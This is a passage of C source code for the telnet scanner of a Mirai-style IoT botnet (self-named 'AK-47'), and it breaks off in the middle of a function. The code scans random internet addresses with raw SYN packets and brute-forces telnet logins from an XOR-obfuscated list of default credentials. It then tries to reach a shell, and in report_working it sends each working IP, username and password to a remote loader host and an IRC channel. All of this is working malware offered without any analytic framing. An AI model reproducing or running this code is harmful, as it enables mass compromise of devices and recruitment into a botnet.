                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static uint32_t x, y, z, w;
void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    tkn_resp = "ncorrect";
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, 8) != -1)
    {
        return -1;
    }

    tkn_resp = "AK47";
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, 4);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, int dport, struct scanner_auth *auth, int sock)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

   union {
       uint32_t raw;
       uint8_t octet[4];
   } ip;
   ip.raw = daddr;
struct in_addr ip_addr;
    ip_addr.s_addr = daddr;
//    printf("The IP address is %s\n", inet_ntoa(ip_addr));    
int scanSock;
    scanSock = socket_connect(decode(SCANLISTENHOST), SCANLISTENPORT);
                                
	Send(scanSock, "%s:%d %s:%s\n", inet_ntoa(ip_addr), dport, auth->username,auth->password);
	Send(sock, "PRIVMSG %s :[AK-47] [-] Sent to echoloader ---> %s:%d %s:%s\n", CHAN, inet_ntoa(ip_addr), dport, auth->username,auth->password);
	close(scanSock);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif
    exit(0);
}


uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
ipv4_t LOCAL_ADDR;
void scanner_init(int sock)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = 1;

    // Set up passwords
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker


#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif
	int port_ = 23;
    // Main logic loop
    while (1)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0)
                {
					port_ = 2323;
                    tcph->dest = htons(2323);
                }
                else
                {
					port_ = 23;
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (1)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (1)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (1)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                send(conn->fd, "enable", 6, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                send(conn->fd, "system", 6, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                send(conn->fd, "shell", 5, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                send(conn->fd, "sh", 2, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                send(conn->fd, "echo -e '\\x41\\x4b\\x34\\x37'", 26, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) == 10)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
